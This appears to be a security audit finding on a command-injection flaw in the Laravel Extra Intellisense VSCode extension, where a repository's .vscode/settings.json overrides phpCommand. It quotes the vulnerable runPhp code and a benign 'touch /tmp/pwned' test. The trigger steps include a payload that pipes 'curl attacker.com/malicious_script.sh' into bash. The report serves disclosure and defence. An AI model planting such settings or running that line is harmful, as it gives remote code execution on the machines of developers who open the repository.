### Vulnerability List:

* **Vulnerability Name:**  Command Injection via Malicious Workspace Settings

* **Description:**
    The "Laravel Extra Intellisense" VSCode extension allows users to configure the `LaravelExtraIntellisense.phpCommand` setting, which defines the command used to execute PHP code for Laravel project analysis. This setting is used by the extension to run arbitrary PHP code within the user's Laravel project context to gather information for autocompletion features. A malicious actor can craft a workspace configuration file (`.vscode/settings.json`) within a seemingly innocuous Laravel project repository. This configuration file can override the `LaravelExtraIntellense.phpCommand` setting with a malicious command. When a victim opens this malicious repository in VSCode with the "Laravel Extra Intellisense" extension installed and activated, the overridden `phpCommand` will be used by the extension to execute PHP code. This can lead to command injection, allowing the attacker to execute arbitrary commands on the victim's machine with the privileges of the VSCode process.

    **Step-by-step trigger:**
    1. Attacker creates a malicious Laravel project repository.
    2. Inside the repository, the attacker creates a `.vscode` directory.
    3. Inside the `.vscode` directory, the attacker creates a `settings.json` file.
    4. In `settings.json`, the attacker sets the `LaravelExtraIntellisense.phpCommand` to a malicious command, for example:
       ```json
       {
           "LaravelExtraIntellisense.phpCommand": "echo '; system(\"curl attacker.com/malicious_script.sh | bash\"); exit;' | php -r \"{code}\""
       }
       ```
    5. The attacker hosts this malicious repository on a public platform like GitHub and lures the victim to clone and open it in VSCode.
    6. Victim clones the repository and opens it in VSCode.
    7. The "Laravel Extra Intellisense" extension activates upon opening the workspace.
    8. The extension reads the workspace settings, including the attacker-controlled `LaravelExtraIntellisense.phpCommand`.
    9. When the extension attempts to gather autocompletion data (e.g., route list, view list, etc.), it uses `Helpers.runLaravel` which internally uses `Helpers.runPhp` with the malicious `phpCommand`.
    10. The `system("curl attacker.com/malicious_script.sh | bash")` command injected by the attacker is executed on the victim's machine.

* **Impact:**
    Remote Code Execution (RCE). The attacker can execute arbitrary commands on the victim's machine, potentially leading to:
    - Data exfiltration: Stealing sensitive files, credentials, or environment variables from the victim's machine.
    - Malware installation: Installing backdoors, ransomware, or other malicious software.
    - System compromise: Gaining complete control over the victim's machine.
    - Lateral movement: Using the compromised machine as a stepping stone to attack other systems on the victim's network.

* **Vulnerability Rank:** Critical

* **Currently Implemented Mitigations:**
    None. The extension directly uses the user-configurable `phpCommand` setting without any sanitization or validation when executing PHP code. The "Security Note" in the README warns about potential issues, but it does not mitigate this specific command injection vulnerability.

* **Missing Mitigations:**
    - **Input Sanitization:**  The extension should sanitize the `phpCommand` setting to prevent command injection.  Specifically, it should prevent users from injecting shell commands within the `phpCommand`.  However, sanitizing shell commands correctly is complex and error-prone.
    - **Parameterization/Escaping:** Instead of string concatenation to build the shell command, the extension should use parameterized execution or proper escaping mechanisms provided by the `child_process.exec` or similar Node.js APIs to separate commands from arguments. However, given the `phpCommand` is intended to be a template string, this might be difficult to implement correctly and still allow for user customization.
    - **Restricting `phpCommand` Configuration:** The extension could restrict how `phpCommand` can be configured. For example, it could disallow workspace-level settings for `phpCommand` and only allow user settings, making it harder for attackers to silently inject malicious commands via repository configuration.
    - **Warning on Configuration Override:** When the extension detects that `phpCommand` is being overridden by workspace settings, it could display a prominent warning to the user, highlighting the potential security risks.
    - **Principle of Least Privilege:**  Consider if the extension truly needs to execute arbitrary shell commands.  If possible, explore alternative approaches to gather necessary information from the Laravel project without relying on `child_process.exec` and user-provided shell command templates. If shell command execution is unavoidable, reduce the scope of commands that can be executed.

* **Preconditions:**
    1. Victim has the "Laravel Extra Intellisense" extension installed and activated in VSCode.
    2. Victim opens a malicious Laravel project repository in VSCode that contains a crafted `.vscode/settings.json` file.
    3. The malicious `.vscode/settings.json` file overrides the `LaravelExtraIntellisense.phpCommand` setting with a malicious command.
    4. The extension attempts to run a Laravel command (which happens automatically in the background to provide autocompletion features).

* **Source Code Analysis:**

    1. **File: `src/helpers.ts`**

    ```typescript
    static async runPhp(code: string, description: string|null = null) : Promise<string> {
        code = code.replace(/\"/g, "\\\"");
        if (['linux', 'openbsd', 'sunos', 'darwin'].some(unixPlatforms => os.platform().includes(unixPlatforms))) {
            code = code.replace(/\$/g, "\\$");
            code = code.replace(/\\\\'/g, '\\\\\\\\\'');
            code = code.replace(/\\\\"/g, '\\\\\\\\\"');
        }
        let commandTemplate = vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('phpCommand') ?? "php -r \"{code}\""; // [!] User-configurable phpCommand is retrieved here.
        let command = commandTemplate.replace("{code}", code); // [!] Vulnerable string replacement to construct the command.
        let out = new Promise<string>(function (resolve, error) {
            if (description != null) {
                Helpers.outputChannel?.info("Laravel Extra Intellisense command started: " + description);
            }

            cp.exec(command, // [!] Command execution using child_process.exec.
                { cwd: vscode.workspace.workspaceFolders && vscode.workspace.workspaceFolders.length > 0 ? vscode.workspace.workspaceFolders[0].uri.fsPath : undefined },
                function (err, stdout, stderr) {
                    // ...
                }
            );
        });
        return out;
    }
    ```

    2. **Vulnerability Flow:**
        - The `runPhp` function in `helpers.ts` retrieves the `phpCommand` setting using `vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('phpCommand')`.
        - It then uses simple string replacement (`commandTemplate.replace("{code}", code)`) to construct the final command to be executed. This is where command injection occurs because the `code` variable, while intended to be PHP code, is embedded directly into the shell command string without proper escaping or parameterization.
        - Finally, `cp.exec(command, ...)` executes the constructed command on the system shell.

    **Visualization:**

    ```
    User Settings (phpCommand)  ----->  getConfiguration()  ----->  commandTemplate
                                        ^
    Malicious settings.json can override phpCommand
                                        |
    PHP Code (extension logic)   ----->  code
                                        |
    String Replacement         ----->  command = commandTemplate.replace("{code}", code)  [VULNERABILITY: Command Injection]
                                        |
    cp.exec(command)           ----->  System Shell  ----->  Command Execution
    ```


* **Security Test Case:**

    **Test Scenario:** Verify command injection vulnerability by overriding `phpCommand` with a malicious command via workspace settings and observing command execution.

    **Steps:**
    1. **Preparation:**
        - Ensure "Laravel Extra Intellisense" extension is installed and activated in VSCode.
        - Create an empty directory named `malicious-laravel-project`.
        - Inside `malicious-laravel-project`, create a `.vscode` directory.
        - Inside `.vscode`, create a `settings.json` file with the following content to override `phpCommand` to execute `touch /tmp/pwned`:
          ```json
          {
              "LaravelExtraIntellisense.phpCommand": "php -r 'system(\"touch /tmp/pwned\"); {code}'"
          }
          ```
        - Open the `malicious-laravel-project` directory in VSCode.

    2. **Trigger Vulnerability:**
        - Wait for the "Laravel Extra Intellisense" extension to activate (it usually activates automatically when a workspace is opened). The extension will attempt to gather Laravel project data in the background. This should trigger the vulnerability. You might need to open a PHP or Blade file in the workspace to ensure the extension is actively trying to provide completions and thus executing `runLaravel`/`runPhp`.

    3. **Verification:**
        - Open a terminal on the victim's machine and check if the file `/tmp/pwned` exists:
          ```bash
          ls -l /tmp/pwned
          ```
        - If the file `/tmp/pwned` exists, it confirms that the `touch /tmp/pwned` command injected via the malicious `phpCommand` was successfully executed, proving the command injection vulnerability.
        - Additionally, check the "Laravel Extra Intellisense" output channel in VSCode (`View -> Output`, then select "Laravel Extra Intellisense" in the dropdown) for any error messages or logs that might indicate the extension attempted to execute commands.

This test case demonstrates that a malicious actor can successfully inject and execute arbitrary commands on a victim's machine by providing a malicious workspace with a crafted `.vscode/settings.json` file that overrides the `LaravelExtraIntellisense.phpCommand` setting.
